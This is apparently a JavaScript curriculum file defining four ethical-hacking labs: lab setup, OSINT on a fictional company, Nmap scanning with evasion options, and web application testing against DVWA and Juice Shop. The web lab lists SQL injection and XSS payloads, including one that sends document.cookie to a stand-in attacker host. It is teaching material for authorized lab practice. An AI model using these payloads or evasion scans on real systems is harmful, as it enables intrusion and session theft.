// Advanced Ethical Hacking Labs
// This file contains practical labs for the 12-week ethical hacking curriculum

export const advancedLabs = [
  // Week 1: Introduction to Ethical Hacking
  {
    title: 'Setting Up Your Ethical Hacking Environment',
    description: 'Learn how to set up a secure virtual lab environment for practicing ethical hacking techniques.',
    instructions: `
# Setting Up Your Ethical Hacking Environment

In this lab, you will set up a complete ethical hacking environment using virtualization software. This environment will serve as your secure sandbox for practicing the techniques learned throughout this course.

## Objectives

1. Install virtualization software
2. Set up Kali Linux as your attack platform
3. Configure vulnerable virtual machines for practice
4. Create an isolated network for secure testing
5. Verify proper isolation and connectivity

## Requirements

* Computer with at least 8GB RAM and 50GB free disk space
* Administrative access to your computer
* Stable internet connection for downloading required files

## Step 1: Install Virtualization Software

1. Download and install VirtualBox from [virtualbox.org](https://www.virtualbox.org/wiki/Downloads)
2. Install the VirtualBox Extension Pack for additional functionality
3. Verify the installation by launching VirtualBox

## Step 2: Set Up Kali Linux

1. Download the Kali Linux VirtualBox image from [kali.org/get-kali/#kali-virtual-machines](https://www.kali.org/get-kali/#kali-virtual-machines)
2. Import the Kali Linux appliance into VirtualBox
   * File > Import Appliance > Select the downloaded .ova file
3. Configure the virtual machine with at least:
   * 2 CPU cores
   * 4GB RAM
   * 60GB disk space
4. Start the Kali Linux VM and log in with the default credentials
   * Username: kali
   * Password: kali
5. Update Kali Linux:
   \`\`\`bash
   sudo apt update
   sudo apt upgrade -y
   \`\`\`

## Step 3: Set Up Vulnerable Machines

1. Download Metasploitable 2:
   * [sourceforge.net/projects/metasploitable/](https://sourceforge.net/projects/metasploitable/)

2. Import Metasploitable 2 into VirtualBox:
   * Create a new VM with Linux/Ubuntu (32-bit)
   * Attach the downloaded VMDK file as the hard disk
   * Configure with 1GB RAM and 1 CPU core

3. Download and import DVWA (Damn Vulnerable Web Application):
   * Create an Ubuntu Server VM
   * Install DVWA following the instructions at [github.com/digininja/DVWA](https://github.com/digininja/DVWA)

## Step 4: Configure Networking

1. Create a Host-Only Network in VirtualBox:
   * File > Host Network Manager > Create
   * Note the IP range (typically 192.168.56.0/24)

2. Configure each VM to use the Host-Only Network:
   * Select each VM > Settings > Network
   * Adapter 1: Host-only Adapter
   * Select the network you created

3. For Kali Linux, add a second network adapter for internet access:
   * Adapter 2: NAT
   * This allows Kali to access the internet while keeping vulnerable machines isolated

## Step 5: Verify Setup

1. Start all virtual machines

2. From Kali Linux, verify connectivity to vulnerable machines:
   \`\`\`bash
   ping [Metasploitable IP]
   ping [DVWA IP]
   \`\`\`

3. Verify internet connectivity from Kali:
   \`\`\`bash
   ping 8.8.8.8
   \`\`\`

4. Verify that vulnerable machines cannot access the internet:
   * From Metasploitable or DVWA, try \`ping 8.8.8.8\` (should fail)

## Deliverables

1. Screenshot showing all VMs running in VirtualBox
2. Screenshot of successful ping from Kali to vulnerable machines
3. Screenshot of network configuration for each VM
4. Brief explanation of your lab setup and network configuration

## Security Considerations

* Never expose vulnerable machines to the internet
* Always use strong passwords even in lab environments
* Keep your virtualization software and VMs updated
* Consider encrypting your virtual machine files
    `,
    difficulty: 'beginner',
    estimatedTime: 120, // minutes
    environmentType: 'local',
    environmentConfig: {
      template: 'basic_lab_setup'
    },
    tools: ['VirtualBox', 'Kali Linux', 'Metasploitable 2', 'DVWA'],
    isPublished: true,
    publishedAt: new Date(),
    moduleId: 1, // Introduction to Ethical Hacking
    submissionType: 'text',
    submissionInstructions: 'Submit screenshots showing your completed lab environment setup along with a brief explanation of your configuration.'
  },

  // Week 3: Reconnaissance and Information Gathering
  {
    title: 'OSINT Investigation Challenge',
    description: 'Practice open-source intelligence gathering techniques to collect information about a target organization.',
    instructions: `
# OSINT Investigation Challenge

In this lab, you will practice open-source intelligence (OSINT) gathering techniques to collect information about a fictional company called "SecureTech Industries." This exercise will help you understand how much information can be gathered without any direct interaction with the target.

## Objectives

1. Gather comprehensive information about SecureTech Industries
2. Identify key employees and their roles
3. Map out the company's digital infrastructure
4. Discover potential security issues or information leakage
5. Document your findings in a professional intelligence report

## Scenario

SecureTech Industries is a fictional mid-sized cybersecurity company that provides security solutions to financial institutions. Your task is to gather as much information as possible about this company using only publicly available sources.

## Requirements

* Kali Linux VM or similar environment
* Internet access
* OSINT tools (theHarvester, Maltego, etc.)
* Documentation tools

## Step 1: Initial Research

1. Begin with basic web searches about SecureTech Industries
2. Document the company's:
   * Main website
   * Social media presence
   * Business description
   * Products and services
   * Office locations
   * Contact information

## Step 2: Employee Information Gathering

1. Identify key employees using:
   * LinkedIn
   * Twitter
   * Company website "About Us" or "Team" pages
   * Press releases and news articles

2. For each key employee, document:
   * Name and position
   * Professional background
   * Contact information
   * Social media profiles
   * Any technical information they've shared publicly

3. Use theHarvester to find email addresses:
   \`\`\`bash
   theHarvester -d securetech.example -b all
   \`\`\`

## Step 3: Technical Infrastructure Analysis

1. Domain information:
   * WHOIS lookup
   * DNS records (A, MX, NS, TXT)
   * Subdomain enumeration

2. Network information:
   * IP ranges
   * Hosting providers
   * Cloud services used

3. Technology stack:
   * Web technologies (use Wappalyzer or similar)
   * CMS systems
   * Third-party services
   * Job postings for technology clues

## Step 4: Digital Footprint Analysis

1. Search for SecureTech Industries in:
   * Code repositories (GitHub, GitLab)
   * Technical forums (Stack Overflow, Reddit)
   * Document sharing sites (SlideShare, Scribd)
   * Data breach databases

2. Use Google dorking techniques:
   \`\`\`
   site:securetech.example filetype:pdf
   site:securetech.example inurl:admin
   site:github.com "securetech.example"
   \`\`\`

## Step 5: Vulnerability Assessment

1. Identify potential security issues:
   * Exposed sensitive documents
   * Leaked credentials
   * Misconfigured servers
   * Outdated software mentioned in job postings or forums

2. Check for the company in:
   * Shodan.io
   * Censys.io
   * SecurityTrails

## Step 6: Create Intelligence Report

Compile your findings into a professional intelligence report with the following sections:

1. Executive Summary
2. Company Overview
3. Key Personnel
4. Technical Infrastructure
5. Digital Footprint
6. Potential Security Concerns
7. Recommendations
8. Appendices (screenshots, raw data)

## Deliverables

1. Complete OSINT intelligence report on SecureTech Industries
2. List of all sources and tools used
3. Timeline of your investigation process
4. Reflection on what information was most valuable and why

## Ethical Considerations

* This is a fictional company created for educational purposes
* In real-world scenarios, always ensure you have proper authorization
* Focus on publicly available information only
* Do not attempt to access any restricted systems or information
    `,
    difficulty: 'intermediate',
    estimatedTime: 180, // minutes
    environmentType: 'browser',
    environmentConfig: {
      template: 'osint_challenge'
    },
    tools: ['theHarvester', 'Maltego', 'Shodan', 'Google Dorks', 'WHOIS'],
    isPublished: true,
    publishedAt: new Date(),
    moduleId: 3, // Reconnaissance and Information Gathering
    submissionType: 'file',
    submissionInstructions: 'Submit your complete intelligence report as a PDF document, including all sections mentioned in the lab instructions.'
  },

  // Week 4: Network Scanning and Enumeration
  {
    title: 'Network Scanning and Enumeration with Nmap',
    description: 'Master the use of Nmap for comprehensive network scanning, port discovery, service detection, and OS fingerprinting.',
    instructions: `
# Network Scanning and Enumeration with Nmap

In this lab, you will learn how to use Nmap, the industry-standard network scanning tool, to perform comprehensive network reconnaissance. You'll practice various scanning techniques to identify hosts, open ports, running services, and operating systems.

## Objectives

1. Perform host discovery on a target network
2. Conduct port scanning using different techniques
3. Identify services running on open ports
4. Perform OS fingerprinting
5. Use NSE scripts for enhanced scanning
6. Analyze and interpret scan results

## Requirements

* Kali Linux VM
* Target virtual machines (Metasploitable 2 and other lab VMs)
* Isolated lab network
* Nmap installed (pre-installed on Kali)

## Step 1: Host Discovery

1. Perform a basic ping scan to identify live hosts:
   \`\`\`bash
   sudo nmap -sn 192.168.56.0/24
   \`\`\`

2. Try different host discovery techniques:
   \`\`\`bash
   # ARP scan (layer 2, local network only)
   sudo nmap -PR -sn 192.168.56.0/24

   # TCP SYN ping
   sudo nmap -PS22,80,443 -sn 192.168.56.0/24

   # TCP ACK ping
   sudo nmap -PA22,80,443 -sn 192.168.56.0/24

   # UDP ping
   sudo nmap -PU53,161 -sn 192.168.56.0/24
   \`\`\`

3. Document all discovered hosts and compare the effectiveness of different techniques

## Step 2: Port Scanning Techniques

For each discovered host, perform the following scans:

1. TCP SYN scan (default):
   \`\`\`bash
   sudo nmap -sS 192.168.56.x
   \`\`\`

2. TCP Connect scan:
   \`\`\`bash
   nmap -sT 192.168.56.x
   \`\`\`

3. UDP scan:
   \`\`\`bash
   sudo nmap -sU --top-ports=20 192.168.56.x
   \`\`\`

4. Comprehensive scan (all ports):
   \`\`\`bash
   sudo nmap -sS -p- 192.168.56.x
   \`\`\`

5. Specific port ranges:
   \`\`\`bash
   sudo nmap -sS -p 1-1000 192.168.56.x
   \`\`\`

6. Common ports scan:
   \`\`\`bash
   sudo nmap -sS --top-ports=100 192.168.56.x
   \`\`\`

## Step 3: Service and Version Detection

1. Perform service version detection:
   \`\`\`bash
   sudo nmap -sV 192.168.56.x
   \`\`\`

2. Combine with port scanning:
   \`\`\`bash
   sudo nmap -sS -sV 192.168.56.x
   \`\`\`

3. Adjust intensity of version detection:
   \`\`\`bash
   sudo nmap -sV --version-intensity 9 192.168.56.x
   \`\`\`

4. Document all identified services and versions

## Step 4: OS Fingerprinting

1. Perform OS detection:
   \`\`\`bash
   sudo nmap -O 192.168.56.x
   \`\`\`

2. Combine with other scan types:
   \`\`\`bash
   sudo nmap -sS -sV -O 192.168.56.x
   \`\`\`

3. Try aggressive detection:
   \`\`\`bash
   sudo nmap -A 192.168.56.x
   \`\`\`

## Step 5: NSE Scripts

1. List available NSE scripts:
   \`\`\`bash
   ls /usr/share/nmap/scripts/
   \`\`\`

2. Run default scripts:
   \`\`\`bash
   sudo nmap -sC 192.168.56.x
   \`\`\`

3. Run specific scripts:
   \`\`\`bash
   # Banner grabbing
   sudo nmap --script=banner 192.168.56.x

   # Vulnerability detection
   sudo nmap --script=vuln 192.168.56.x

   # Authentication enumeration
   sudo nmap --script=auth 192.168.56.x

   # SMB enumeration
   sudo nmap --script=smb-enum-* 192.168.56.x
   \`\`\`

4. Document the additional information gathered with NSE scripts

## Step 6: Output Formats and Analysis

1. Save scan results in different formats:
   \`\`\`bash
   # Normal output
   sudo nmap -A 192.168.56.x -oN scan_results.txt

   # XML output
   sudo nmap -A 192.168.56.x -oX scan_results.xml

   # Grepable output
   sudo nmap -A 192.168.56.x -oG scan_results.gnmap

   # All formats
   sudo nmap -A 192.168.56.x -oA scan_results
   \`\`\`

2. Analyze the results:
   * Identify all open ports and services
   * Note unusual or potentially vulnerable services
   * Document OS detection results
   * Highlight any security issues found by NSE scripts

## Step 7: Advanced Scanning Techniques

1. Try timing templates:
   \`\`\`bash
   sudo nmap -T4 192.168.56.x
   \`\`\`

2. Evade firewalls with fragmentation:
   \`\`\`bash
   sudo nmap -f 192.168.56.x
   \`\`\`

3. Use decoys:
   \`\`\`bash
   sudo nmap -D RND:5 192.168.56.x
   \`\`\`

4. Spoof source IP (only in lab environment):
   \`\`\`bash
   sudo nmap -S 10.0.0.1 192.168.56.x
   \`\`\`

## Deliverables

1. Comprehensive scan report for each target host including:
   * Live host discovery results
   * Open ports and services
   * Service versions
   * Operating system details
   * Vulnerabilities or security issues identified

2. Comparison of different scanning techniques:
   * Effectiveness
   * Speed
   * Stealth
   * Accuracy

3. Analysis of the security posture of the target network based on scan results

## Ethical Considerations

* Only perform these scans in your isolated lab environment
* These techniques may be illegal if used without authorization
* In real-world assessments, always work within the defined scope
    `,
    difficulty: 'intermediate',
    estimatedTime: 150, // minutes
    environmentType: 'local',
    environmentConfig: {
      template: 'network_scanning'
    },
    tools: ['Nmap', 'Wireshark', 'Metasploitable 2'],
    isPublished: true,
    publishedAt: new Date(),
    moduleId: 4, // Network Scanning and Enumeration
    submissionType: 'file',
    submissionInstructions: 'Submit a comprehensive report documenting your scanning methodology, results, and analysis. Include screenshots of key findings and command outputs.'
  },

  // Week 6: Web Application Security
  {
    title: 'Web Application Penetration Testing',
    description: 'Practice identifying and exploiting common web application vulnerabilities in a controlled environment.',
    instructions: `
# Web Application Penetration Testing

In this lab, you will practice identifying and exploiting common web application vulnerabilities following the OWASP methodology. You'll work with intentionally vulnerable applications to understand how these vulnerabilities work and how to exploit them.

## Objectives

1. Set up and explore vulnerable web applications
2. Identify and exploit SQL injection vulnerabilities
3. Discover and exploit Cross-Site Scripting (XSS) vulnerabilities
4. Test for authentication and session management flaws
5. Identify and exploit broken access controls
6. Document findings in a professional penetration testing report

## Requirements

* Kali Linux VM
* DVWA (Damn Vulnerable Web Application)
* OWASP Juice Shop
* Burp Suite (Community Edition)
* Web browsers with developer tools

## Step 1: Set Up Vulnerable Applications

1. Start DVWA:
   * Access DVWA through your web browser
   * Log in with default credentials (admin/password)
   * Set the security level to "low" for initial testing

2. Start OWASP Juice Shop:
   * Access Juice Shop through your web browser
   * Explore the application interface

## Step 2: SQL Injection Testing

### DVWA SQL Injection

1. Navigate to the SQL Injection page in DVWA
2. Try basic SQL injection with:
   * \`1' OR '1'='1\`
   * \`1' OR 1=1 -- -\`
   * \`' UNION SELECT user,password FROM users -- -\`

3. Document the results of each injection attempt
4. Extract database information:
   * Database version
   * Database name
   * Table names
   * Column names
   * User credentials

### Juice Shop SQL Injection

1. Identify login forms or search functionality
2. Test for SQL injection vulnerabilities
3. Attempt to bypass authentication or extract data
4. Document your findings

## Step 3: Cross-Site Scripting (XSS)

### DVWA XSS Testing

1. Navigate to the XSS (Reflected) page
2. Test basic XSS payloads:
   * \`<script>alert('XSS')</script>\`
   * \`<img src="x" onerror="alert('XSS')">\`
   * \`<body onload="alert('XSS')">\`

3. Try to bypass filters at higher security levels
4. Test stored XSS in the guestbook or message functionality
5. Create a payload that steals cookies:
   \`\`\`javascript
   <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
   \`\`\`

### Juice Shop XSS Testing

1. Identify input fields that might be vulnerable to XSS
2. Test various XSS payloads
3. Attempt to create a persistent XSS attack
4. Document all successful exploits

## Step 4: Authentication and Session Testing

1. Analyze the authentication mechanism:
   * Test for weak passwords
   * Check for username enumeration
   * Test for brute force protection

2. Examine session management:
   * Analyze cookie properties (HttpOnly, Secure, SameSite)
   * Test session timeout
   * Check for session fixation vulnerabilities

3. Test password reset functionality:
   * Look for insecure email verification
   * Test for username enumeration
   * Check for token predictability

## Step 5: Access Control Testing

1. Test horizontal access controls:
   * Access another user's profile or data
   * Modify another user's information

2. Test vertical access controls:
   * Access admin functionality as a regular user
   * Bypass role-based restrictions

3. Test for insecure direct object references (IDOR):
   * Manipulate IDs in URLs or request parameters
   * Access resources not intended for your user

## Step 6: Other OWASP Top 10 Vulnerabilities

1. Test for insecure deserialization
2. Look for XML External Entity (XXE) vulnerabilities
3. Check for security misconfigurations
4. Test for components with known vulnerabilities

## Step 7: Using Burp Suite

1. Configure Burp Suite as a proxy for your browser
2. Use the Proxy tab to intercept and modify requests
3. Use the Repeater to manipulate and resend requests
4. Use the Intruder for automated testing
5. Document how Burp Suite enhances your testing capabilities

## Deliverables

1. Comprehensive penetration testing report including:
   * Executive summary
   * Methodology
   * Findings with severity ratings
   * Proof of concept for each vulnerability
   * Recommendations for remediation

2. Screenshots demonstrating successful exploits
3. Sample payloads used for each vulnerability type
4. Reflection on the most critical vulnerabilities found

## Ethical Considerations

* Only perform these tests on the provided vulnerable applications
* Never use these techniques on real websites without authorization
* Understand that these skills should only be used for defensive purposes or authorized testing
    `,
    difficulty: 'advanced',
    estimatedTime: 240, // minutes
    environmentType: 'local',
    environmentConfig: {
      template: 'web_pentesting'
    },
    tools: ['Burp Suite', 'DVWA', 'OWASP Juice Shop', 'SQLmap', 'OWASP ZAP'],
    isPublished: true,
    publishedAt: new Date(),
    moduleId: 6, // Web Application Security
    submissionType: 'file',
    submissionInstructions: 'Submit a professional penetration testing report documenting all vulnerabilities discovered, along with proof of concept screenshots and remediation recommendations.'
  }
];
